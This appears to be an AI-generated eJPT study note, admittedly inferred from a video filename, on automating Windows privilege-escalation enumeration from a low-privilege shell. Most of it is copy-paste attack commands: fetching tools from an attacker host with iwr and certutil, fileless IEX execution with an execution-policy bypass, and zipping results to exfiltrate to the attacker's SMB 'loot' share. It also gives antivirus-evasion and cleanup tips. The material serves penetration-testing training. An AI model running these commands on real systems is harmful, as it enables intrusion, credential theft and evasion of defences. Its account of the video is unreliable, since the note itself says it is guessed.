# What the video covers (Introduction / big picture)
Note: No transcript was provided. The following is a conservative, context-based summary inferred from the filename “13 - Automating Windows Local Enumeration” in the “01-WindowsLocalEnumeration” folder for eJPT.

This video shows how to quickly automate Windows local enumeration after getting an initial low-privilege shell. It focuses on:
- Transferring and running well-known Windows privilege escalation enumeration tools
- One-liners to bypass execution policy and run PowerShell-based checks
- Capturing outputs in files for offline review
- Feeding systeminfo into an exploit suggester
- Workflow, OPSEC, and cleanup

# Flow (ordered)
1. Prepare your attacker box with an HTTP and/or SMB server and the enumeration tools.
2. Create a writable working directory on the target (e.g., ProgramData or Temp).
3. Transfer automated enumeration tools to the target (PowerShell iwr, certutil, or SMB copy).
4. Run quick native baseline commands (whoami, systeminfo) and save outputs.
5. Run multiple automated enumerators (winPEAS, Seatbelt, SharpUp, PowerUp/PrivescCheck).
6. Collect/zip outputs and exfiltrate to your box for analysis (SMB/HTTP).
7. Optionally run Windows Exploit Suggester (WES-NG) against systeminfo output.
8. Review findings to identify privesc vectors; cleanup artifacts on the target.

# Tools highlighted
- winPEAS (PEASS-ng): Comprehensive Windows local privesc enumeration (binary/any.exe).
- Seatbelt: OPSEC-friendlier triage of common insecure configs and loot.
- SharpUp: Identifies privesc opportunities (weak service perms, dll hijack, etc.).
- PowerUp (PowerSploit): PowerShell privilege escalation checks (Invoke-AllChecks).
- PrivescCheck: PowerShell-based local privesc checks (good coverage on modern Windows).
- JAWS: PowerShell enumeration (older but useful HTML/txt report).
- WES-NG (Windows Exploit Suggester - Next Gen): Maps systeminfo/patches to known CVEs.
- Native utilities: whoami, systeminfo, ipconfig, net, sc, reg, wmic/schtasks.

# Typical command walkthrough (detailed, copy-paste friendly)

Prepare attacker box (Kali/Parrot)
```
# 1) Place tools in a folder (examples)
mkdir -p ~/win-enum && cd ~/win-enum
# Download tools (examples; adjust as needed)
# winPEAS
git clone https://github.com/carlospolop/PEASS-ng.git
cp PEASS-ng/winPEAS/winPEASexe/winPEASany.exe ./winPEASany.exe 2>/dev/null || true

# Seatbelt
wget -O Seatbelt.exe https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe

# SharpUp
wget -O SharpUp.exe https://github.com/GhostPack/SharpUp/releases/latest/download/SharpUp.exe

# PowerUp (PowerSploit) & PrivescCheck & JAWS
wget -O PowerUp.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
wget -O PrivescCheck.ps1 https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
wget -O jaws-enum.ps1 https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1

# 2) Start an HTTP server to serve files
cd ~/win-enum
python3 -m http.server 8000

# (Optional) Start an SMB share for exfil/retrieval
# Requires impacket
mkdir -p ~/win-enum/share
cp ./* ~/win-enum/share/
impacket-smbserver loot ~/win-enum/share -smb2support
```

On the Windows target (PowerShell, low-priv shell)
```
# 1) Create a working dir (commonly writable)
$wd="$env:ProgramData\enum"; New-Item -ItemType Directory -Path $wd -Force | Out-Null; Set-Location $wd

# Set attacker IP and port (HTTP server)
$att="ATTACKER_IP"; $port=8000

# 2) Quick baseline (native)
whoami /all         > .\whoami.txt
systeminfo          > .\systeminfo.txt
ipconfig /all       > .\ipconfig.txt

# 3) Transfer tools via HTTP (PowerShell)
Invoke-WebRequest -Uri "http://$att:$port/winPEASany.exe" -OutFile .\winPEASany.exe
Invoke-WebRequest -Uri "http://$att:$port/Seatbelt.exe"   -OutFile .\Seatbelt.exe
Invoke-WebRequest -Uri "http://$att:$port/SharpUp.exe"    -OutFile .\SharpUp.exe

# 4) Run automated enumerators (redirect output to files)
.\winPEASany.exe                         > .\winpeas.txt
.\Seatbelt.exe -group=all                > .\seatbelt.txt
.\SharpUp.exe audit                      > .\sharpup.txt

# 5) PowerShell-based checks (bypass execution policy only for this process)
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# PowerUp
$pu=(Invoke-WebRequest -Uri "http://$att:$port/PowerUp.ps1").Content
Invoke-Expression $pu
Invoke-AllChecks                              > .\powerup.txt  2>&1

# PrivescCheck (basic; add -Extended for deeper checks)
$pc=(Invoke-WebRequest -Uri "http://$att:$port/PrivescCheck.ps1").Content
Invoke-Expression $pc
Invoke-PrivescCheck                           > .\privesccheck.txt 2>&1

# (Optional) JAWS with output file
Invoke-WebRequest -Uri "http://$att:$port/jaws-enum.ps1" -OutFile .\jaws-enum.ps1
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename .\jaws.txt

# 6) Zip results for exfil
Compress-Archive -Path *.txt -DestinationPath .\enum-results.zip -Force

# 7) Exfil option A: copy to attacker SMB share (if impacket-smbserver loot is running)
Copy-Item .\enum-results.zip "\\$att\loot\enum-results.zip"

# 7) Exfil option B: Start a quick HTTP server on target and pull from attacker
# (If Python present on target)
# python -m http.server 8081
# Then pull http://TARGET_IP:8081/enum-results.zip from your attacker

# 8) Cleanup (after verification that exfil succeeded)
Remove-Item .\winPEASany.exe,.\Seatbelt.exe,.\SharpUp.exe,.\jaws-enum.ps1 -Force -ErrorAction SilentlyContinue
# Optionally remove PS scripts and working dir (ensure you won’t need them)
# Remove-Item .\PowerUp.ps1,.\PrivescCheck.ps1 -Force -ErrorAction SilentlyContinue
# Remove-Item $wd -Recurse -Force
```

WES-NG (Windows Exploit Suggester) on attacker
```
# Install and update database
pipx install wesng || pip3 install wesng
wesng --update || python3 -m wesng --update

# Use the systeminfo.txt you exfiltrated
wesng -i systeminfo.txt -o wes-results.txt
# Or (depending on install method)
python3 -m wesng -i systeminfo.txt -o wes-results.txt
```

Alternative transfers (target, CMD)
```
:: certutil download
certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASany.exe C:\ProgramData\enum\winPEASany.exe

:: SMB mapping/copy (may work unauthenticated against impacket-smbserver)
net use \\ATTACKER_IP\loot
copy C:\ProgramData\enum\enum-results.zip \\ATTACKER_IP\loot\
```

# Practical tips
- Prefer common writable dirs: C:\ProgramData, C:\Users\Public, or %TEMP%.
- Use 64-bit binaries on 64-bit Windows to avoid WOW64 blind spots.
- If Defender/AV flags a tool, try:
  - Renaming the file
  - Using the PowerShell script variant (PowerUp/PrivescCheck)
  - Running a “quieter” tool like Seatbelt first
  - Zipping/encrypting in transit and extracting locally
- Always save outputs to files for offline analysis; don’t rely on scrollback.
- If PowerShell constrained language mode is enforced, fall back to native commands and winPEASany.exe.
- Collect systeminfo and whoami /all early; they’re fast and feed other tools (like WES-NG).
- Network egress blocked? Use SMB exfil with impacket-smbserver or encode output inline (Base64) if needed.
- Clean up artifacts to reduce footprint; keep hashes or copies on your box for reporting.
- Combine tool findings: no single tool catches all privesc vectors.

# Minimal cheat sheet (one-screen flow)
```
# Attacker
cd ~/win-enum && python3 -m http.server 8000
impacket-smbserver loot ~/win-enum -smb2support

# Target (PowerShell)
$att="ATTACKER_IP"; $port=8000; $wd="$env:ProgramData\enum"
mkdir $wd -Force | Out-Null; cd $wd
whoami /all > whoami.txt; systeminfo > systeminfo.txt; ipconfig /all > ip.txt
iwr http://$att:$port/winPEASany.exe -OutFile wp.exe; .\wp.exe > winpeas.txt
iwr http://$att:$port/Seatbelt.exe   -OutFile sb.exe; .\sb.exe -group=all > seatbelt.txt
iwr http://$att:$port/SharpUp.exe    -OutFile su.exe; .\su.exe audit > sharpup.txt
Set-ExecutionPolicy Bypass -Scope Process -Force
IEX(iwr http://$att:$port/PowerUp.ps1); Invoke-AllChecks > powerup.txt 2>&1
IEX(iwr http://$att:$port/PrivescCheck.ps1); Invoke-PrivescCheck > privesccheck.txt 2>&1
Compress-Archive -Path *.txt -DestinationPath enum-results.zip -Force
Copy-Item .\enum-results.zip "\\$att\loot\enum-results.zip"
```

# Summary
Automating Windows local enumeration accelerates your path to privilege escalation by quickly surfacing misconfigurations, weak permissions, stored credentials, and missing patches. The standard eJPT-friendly workflow is: set up simple HTTP/SMB hosting, stage a writable working directory on the host, run a small set of trusted automated tools (winPEAS, Seatbelt, SharpUp, PowerUp/PrivescCheck), save outputs, and analyze them offline (optionally with WES-NG). Keep OPSEC in mind (execution policy bypass scoped to process, minimize artifacts, and clean up), and combine findings from several tools for best coverage.